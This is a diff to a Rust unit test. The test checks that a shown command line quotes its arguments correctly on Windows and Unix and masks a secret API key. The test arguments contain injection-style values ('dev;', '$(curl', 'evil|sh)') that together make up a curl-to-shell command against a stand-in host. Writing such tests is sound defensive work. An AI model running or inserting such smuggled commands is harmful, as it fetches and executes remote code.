@@ -829,7 +829,12 @@ mod tests {
             "evil|sh)",
         ]);
         let shown = display_of(&argv);
-        assert_eq!(shown, "npm run 'dev;' 'API_KEY=•••' '$(curl' 'evil|sh)'");
+        // shell_join quotes with ' on Unix and " on Windows; the structure is the same.
+        let q = if cfg!(windows) { '"' } else { '\'' };
+        assert_eq!(
+            shown,
+            format!("npm run {q}dev;{q} {q}API_KEY=•••{q} {q}$(curl{q} {q}evil|sh){q}")
+        );
         assert!(!shown.contains("hunter2"));
     }
 
